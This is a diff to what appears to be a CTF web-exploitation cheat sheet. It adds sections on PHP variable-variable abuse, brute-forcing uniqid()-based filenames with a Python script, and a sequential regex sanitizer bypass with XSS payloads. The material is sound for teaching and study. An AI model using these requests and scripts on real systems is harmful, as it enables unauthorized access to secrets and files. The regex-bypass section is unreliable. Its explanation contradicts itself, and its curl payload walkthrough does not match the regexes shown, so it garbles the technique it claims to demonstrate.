@@ -22,6 +22,9 @@
   - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
   - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
 - [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
+- [PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)](#php-variable-variables-var-abuse-bugs_bunny-2017)
+- [PHP uniqid() Predictable Filename (EKOPARTY 2017)](#php-uniqid-predictable-filename-ekoparty-2017)
+- [Sequential Regex Replacement Bypass (Tokyo Westerns 2017)](#sequential-regex-replacement-bypass-tokyo-westerns-2017)
 - [Command Injection](#command-injection)
   - [Newline Bypass](#newline-bypass)
   - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
@@ -389,6 +392,94 @@ X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
 Produces: `<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>` -- the XML parser takes the first `<admin>true</admin>`, ignoring the legitimate `<admin>false</admin>` that follows.
 
 **Key insight:** XML injection via HTTP headers when server builds XML from header values without escaping. First-match semantics exploit duplicate tags. Check any header that appears in server responses or logs as structured data (`X-Forwarded-For`, `User-Agent`, `Referer`).
+
+---
+
+## PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)
+
+**Pattern:** PHP's variable variables (`$$key`) allow using a variable's value as the name of another variable. When a loop iterates over GET/POST parameters and assigns them as `$$key = $$value`, supplying `?_200=flag` captures `$flag`'s value into `$_200` before it gets overwritten.
+
+```php
+// Vulnerable pattern: loop that processes GET parameters as variable aliases
+foreach ($_GET as $key => $value) {
+    $$key = $$value;  // e.g., key="_200", value="flag" → $_200 = $flag
+}
+// Later: echo $_200;  // outputs the flag
+```
+
+```bash
+# Supply a "safe" output variable name as key, protected variable name as value
+curl "http://target/page.php?_200=flag"
+# PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
+```
+
+**How to find the output variable:** Look for variables beginning with HTTP status codes (e.g., `$_200`, `$_404`) in the source, or any variable echoed to output that starts with an underscore.
+
+**Key insight:** `$$key` creates arbitrary variable aliases; iterating GET/POST params with `$$key = $$value` lets an attacker redirect protected variables (like `$flag`) into any output variable they control by naming the output variable as the key and the secret variable as the value.
+
+---
+
+## PHP uniqid() Predictable Filename (EKOPARTY 2017)
+
+**Pattern:** PHP's `uniqid()` uses `gettimeofday()` internally. The first 8 hex characters encode the Unix timestamp in seconds, making filenames predictable within a bounded time window.
+
+```php
+// Vulnerable: uses uniqid() to name an uploaded/generated file
+$filename = uniqid() . '_flag.txt';
+// e.g., "5a1b2c3d4e5f6_flag.txt" where first 8 chars = hex(unix_timestamp)
+```
+
+```python
+import requests
+import time
+
+# Know approximate upload time (from server Date header, challenge hint, etc.)
+start_ts = int(time.time()) - 60   # 60 second window before now
+end_ts   = int(time.time()) + 10
+
+for ts in range(start_ts, end_ts):
+    hex_prefix = format(ts, '08x')
+    url = f'http://target/uploads/{hex_prefix}_flag.txt'
+    r = requests.get(url)
+    if r.status_code == 200:
+        print(f"Found: {url}")
+        print(r.text)
+        break
+```
+
+**Narrowing the window:** The server's `Date` response header tells you the server's current time. Record it when triggering file creation; the timestamp in the filename will match that second.
+
+**Key insight:** PHP `uniqid()` first 8 hex chars = Unix timestamp in seconds. The file is fully predictable within a known time window — brute-force is O(seconds in window), typically under 100 requests.
+
+---
+
+## Sequential Regex Replacement Bypass (Tokyo Westerns 2017)
+
+**Pattern:** When a sanitizer applies regex replacements sequentially (not simultaneously), the first replacement can produce a substring that the second replacement should catch — but since the second replacement already ran (or the first runs after the second), the dangerous pattern survives.
+
+```php
+// Vulnerable: replacements run in sequence on the same string
+$input = preg_replace('/on\w+=\S+/', '', $input);   // pass 1: strip event handlers
+$input = preg_replace('/<script[^>]*>/', '', $input); // pass 2: strip script tags
+```
+
+```text
+# Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
+# Input: <scr<script>ipt>
+# Pass 2 strips inner <script> → leaves: <script>
+# The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
+```
+
+```bash
+# Practical bypass — embed the dangerous string inside the blocked string:
+# If filter strips "script" then strips "on.*=":
+curl "http://target/" --data 'input=<img sron=c onerror=alert(1)>'
+# Pass 1 strips "onerror=" leaving  <img src onerror=alert(1)> with partial strip
+# Exact bypass depends on regex — test with variations like:
+# <scr\x00ipt>, <scr ipt>, embed keyword inside itself
+```
+
+**Key insight:** Sequential regex replacements let pass N reconstruct what pass M already checked. The first replacement produces a pattern the second was designed to catch, but because the second has already run (or the first runs last), the reconstructed dangerous pattern passes through. Always apply sanitization in a single idempotent pass or use a parser-based sanitizer.
 
 ---
 
